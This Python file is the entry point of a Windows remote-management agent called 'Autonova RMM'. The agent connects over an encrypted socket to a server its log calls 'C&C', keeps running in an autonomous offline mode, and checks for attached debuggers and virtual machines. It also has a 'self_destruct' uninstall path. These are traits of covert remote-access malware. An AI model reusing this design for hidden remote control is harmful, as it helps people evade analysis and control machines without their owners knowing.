"""
Autonova RMM - Client Agent Entry Point
Main executable for the Windows agent.
"""

import asyncio
import logging
import sys
import signal
from datetime import datetime

from .config import Config
from .network import create_socket_client, SocketManager
from .security import is_admin, elevate_privileges, get_security_status


# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('autonova')


class AutonovaAgent:
    """Main agent controller class."""
    
    def __init__(self):
        """Initialize the agent."""
        self.socket_manager: SocketManager = None
        self.running = False
        self.offline_mode = False
    
    async def start(self):
        """Start the agent."""
        logger.info("=" * 50)
        logger.info("Autonova RMM Agent Starting")
        logger.info("=" * 50)
        
        # Load configuration
        Config.load()
        logger.info(f"Agent ID: {Config.AGENT_ID}")
        logger.info(f"Server: {Config.SERVER_URL}")
        
        # Check security status
        security = get_security_status()
        logger.info(f"Running as admin: {security['is_admin']}")
        
        if security['debugger_attached'] or security['remote_debugger']:
            logger.warning("Debugger detected!")
        
        if security['vm_detected']:
            logger.info("Virtual machine environment detected")
        
        # Request elevation if not admin
        if not security['is_admin']:
            logger.warning("Not running with admin privileges - some features may be limited")
        
        # Initialize autonomous manager
        from .core.autonomous_manager import get_autonomous_manager
        self.autonomous = get_autonomous_manager()
        
        # Create socket client
        self.socket_manager = await create_socket_client(
            server_url=Config.SERVER_URL,
            agent_id=Config.AGENT_ID,
            encryption_key=Config.ENCRYPTION_KEY
        )
        
        self.running = True
        
        # Try to connect
        try:
            await self.socket_manager.connect()
            logger.info("Connected to C&C server")
            await self.autonomous.connection_restored(self.socket_manager)
        except Exception as e:
            logger.error(f"Failed to connect to server: {e}")
            logger.info("Running in AUTONOMOUS mode - will queue actions and retry")
            self.offline_mode = True
            await self.autonomous.connection_lost()
        
        # Main loop
        await self._main_loop()
    
    async def _main_loop(self):
        """Main agent loop with intelligent reconnection."""
        reconnect_attempts = 0
        last_autonomous_check = datetime.now()
        
        while self.running:
            try:
                # Check connection status
                if not self.socket_manager.is_connected:
                    if not self.offline_mode:
                        logger.warning("Lost connection to server")
                        await self.autonomous.connection_lost()
                    
                    self.offline_mode = True
                    reconnect_attempts += 1
                    
                    # Get smart retry interval from autonomous manager
                    self.autonomous.retry_count = reconnect_attempts
                    delay = self.autonomous.get_retry_interval()
                    
                    logger.info(f"Attempting reconnection in {delay}s... (intento {reconnect_attempts})")
                    await asyncio.sleep(delay)
                    
                    try:
                        await self.socket_manager.connect()
                        logger.info("✅ Reconnected to server")
                        await self.autonomous.connection_restored(self.socket_manager)
                        self.offline_mode = False
                        reconnect_attempts = 0
                    except Exception:
                        # If many failed attempts, run autonomous checks
                        if reconnect_attempts >= 3:
                            elapsed = (datetime.now() - last_autonomous_check).seconds
                            if elapsed > 60:  # Every minute in offline mode
                                logger.info("🤖 Running autonomous health check...")
                                await self._run_autonomous_check()
                                last_autonomous_check = datetime.now()
                else:
                    # Connected - normal operation
                    await asyncio.sleep(1)
                    
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Main loop error: {e}")
                await asyncio.sleep(5)
    
    async def _run_autonomous_check(self):
        """Run autonomous health check when offline."""
        try:
            from .core import run_full_scan
            from .core.autonomous_manager import get_autonomous_manager
            
            auto = get_autonomous_manager()
            
            # Run scan
            scan_results = await run_full_scan()
            
            # Analyze and decide
            recommendations = await auto.analyze_and_decide(scan_results)
            
            # Queue critical actions
            for rec in recommendations:
                if rec.get("priority") and rec["priority"].value <= 2:  # CRITICAL or HIGH
                    auto.queue_action(
                        rec["action"],
                        rec.get("params", {}),
                        rec["priority"]
                    )
            
            # Queue scan results for sync
            auto.queue_for_sync("scan_results", scan_results)
            
            logger.info(f"Autonomous check complete. {len(recommendations)} recommendations.")
            
        except Exception as e:
            logger.error(f"Autonomous check error: {e}")
    
    async def stop(self):
        """Stop the agent gracefully."""
        logger.info("Shutting down agent...")
        self.running = False
        
        if self.socket_manager:
            await self.socket_manager.disconnect()
        
        logger.info("Agent stopped")


async def main():
    """Main entry point."""
    agent = AutonovaAgent()
    
    # Handle shutdown signals
    loop = asyncio.get_event_loop()
    
    def signal_handler():
        asyncio.create_task(agent.stop())
    
    if sys.platform != 'win32':
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, signal_handler)
    
    try:
        await agent.start()
    except KeyboardInterrupt:
        await agent.stop()
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        await agent.stop()
        sys.exit(1)


def run():
    """Entry point for the agent."""
    # Check for command line arguments
    if '--uninstall' in sys.argv:
        from .scripts.self_destruct import initiate_self_destruct
        asyncio.run(initiate_self_destruct())
        return
    
    # Run the agent
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    run()
